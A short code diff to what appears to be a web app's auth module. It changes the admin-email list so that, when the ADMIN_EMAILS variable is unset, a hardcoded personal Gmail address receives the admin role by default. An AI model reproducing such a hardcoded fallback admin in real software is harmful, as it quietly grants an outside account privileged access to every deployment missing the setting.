@@ -88,7 +88,7 @@ export async function getCurrentUser(): Promise<SessionUser | null> {
 
 export function roleForEmail(email: string): UserRole {
   const normalized = normalizeEmail(email);
-  const admins = String(process.env.ADMIN_EMAILS || "")
+  const admins = String(process.env.ADMIN_EMAILS || "victoryonline1@gmail.com")
     .split(",")
     .map(normalizeEmail)
     .filter(Boolean);
